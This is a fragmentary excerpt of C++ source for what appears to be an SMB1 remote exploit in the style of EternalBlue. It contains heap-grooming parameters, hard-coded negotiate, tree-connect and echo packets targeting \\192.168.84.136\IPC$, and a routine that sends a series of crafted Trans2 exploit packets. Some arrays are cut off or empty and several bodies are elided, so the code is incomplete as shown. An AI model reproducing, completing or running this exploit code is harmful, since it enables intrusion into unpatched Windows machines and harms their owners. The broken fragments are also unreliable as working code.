...
private:
    ...
    int groomDelta = 5;
    int maxExploitAttempts = 3;

    unsigned char smbNegotiate[51];
    unsigned char sessionSetup[136];
    unsigned char treeConnectRequest[76];
...
private:
    ...
    void InitializePackets() {
        unsigned char negotiate[] = {
            0x00, 0x00, 0x00, 0x2F, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00,
            0x00, 0x18, 0x01, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ...
        unsigned char setup[] = {
            
        };
        memcpy(sessionSetup, setup, sizeof(setup));

        unsigned char treeConnect[] = {
            0x00, 0x00, 0x00, 0x48, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00, 0x00, 0x00,
            0x00, 0x18, 0x01, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
            0x04, 0xFF, 0x00, 0x00, 0x00, 0x08, 0x00, 0x01, 0x00, 0x1D, 0x00, 0x00,
            0x5C, 0x5C, 0x31, 0x39, 0x32, 0x2E, 0x31, 0x36, 0x38, 0x2E, 0x38, 0x34,
            0x2E, 0x31, 0x33, 0x36, 0x5C, 0x49, 0x50, 0x43, 0x24, 0x00, 0x3F, 0x3F,
            0x3F, 0x3F, 0x3F, 0x00
        };
        memcpy(treeConnectRequest, treeConnect, sizeof(treeConnect));

        unsigned char echo[] = {
            0x00, 0x00, 0x00, 0x31, 0xFF, 0x53, 0x4D, 0x42, 0x2B, 0x00, 0x00, 0x00,
            0x00, 0x18, 0x01, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
            0x01, 0x01, 0x00, 0x0C, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
    ...
    bool SendNTLargeBuffer(SOCKET sock) {
        ...
        if (!Send(sock, trans2_zero_pkt.data(), trans2_zero_pkt.size()))
                return false;

        for (int i = 1; i < 15; i++) {
            auto trans2_buffer_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_BUFFER, i);
            if (!Send(sock, trans2_buffer_pkt.data(), trans2_buffer_pkt.size()))
                return false;
        }

        if (!Send(sock, echoRequest, sizeof(echoRequest))) 
            return false;
        Recv(sock, resp, sizeof(resp));
